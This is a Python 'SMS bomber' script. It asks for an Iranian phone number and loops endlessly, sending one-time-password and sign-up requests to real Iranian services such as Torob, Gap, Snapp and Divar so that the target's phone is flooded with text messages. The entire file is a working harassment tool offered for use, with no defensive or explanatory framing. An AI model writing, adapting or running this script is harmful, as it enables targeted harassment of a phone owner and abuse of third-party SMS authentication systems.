import requests ,os
from colorama import Fore,Style

os.system("clear" or "cls")
print("welcome to smsbomber null-programmer\n")
api_divar = 'https://api.divar.ir/v5/auth/authenticate'
api_snapp = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
api_bazar = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'
api_tejaratbank ='https://mbt.tejaratbank.ir/api/card-registration/verify'
api_torob = 'https://api.torob.com/a/phone/send-pin/?phone_number='
api_rubika = 'https://messengerg2c51.iranlms.ir/'
api_gap = 'https://core.gap.im/v1/user/add.json?mobile=0'
number = input('Please Enter a Phone Number ( not support [+98], example [9157290214] : \n')
if "+98" in number:
    print("not support phone [+98] and [0] enter try again\n")
    number = input('Please Enter a Phone Number ( not support [+98], example [9157290214] : \n')
else:
    try:

        while True:

            try:
                #--------------------------------------------------------------
                req_torob = requests.get(api_torob+"0"+number)
                if req_torob.status_code == 200:
                    print("===> "+Fore.YELLOW+" req_torob "+Fore.GREEN+" success "+Fore.RESET)
                else:
                    print("===> "+Fore.YELLOW+" req_torob "+Fore.RED+" ERROR "+Fore.RESET)
                #---------------------------------------------------------------

                #---------------------------------------------------------------
                req_gap = requests.get(api_gap+number)
                if req_gap.status_code == 200:
                    print("===> "+Fore.YELLOW+" req_gap "+Fore.GREEN+"   success "+Fore.RESET)
                else:
                    print("===> "+Fore.YELLOW+" req_gap "+Fore.RED+"   ERROR "+Fore.RESET)
                #---------------------------------------------------------------

                #---------------------------------------------------------------
                req_snap = requests.post(api_snapp,data={'cellphone':'+98'+number})
                if req_snap.status_code == 200:
                    print("===> "+Fore.YELLOW+" req_snap "+Fore.GREEN+"  success "+Fore.RESET)
                else:
                    print("===> "+Fore.YELLOW+" req_snap "+Fore.RED+"  ERROR "+Fore.RESET)
                #---------------------------------------------------------------

                #---------------------------------------------------------------
                req_divar = requests.post(api_divar,json={'phone':f"0{number}"})
                if req_divar.status_code == 200:
                     print("===> "+Fore.YELLOW+" req_divar "+Fore.GREEN+" success "+Fore.RESET)
                else:
                    print("===> "+Fore.YELLOW+" req_divar "+Fore.RED+" ERROR "+Fore.RESET)
                    continue
                #---------------------------------------------------------------
                
            except Exception:
                print("no Internet connection!")
                break
    except:
        pass
            
print("googby")

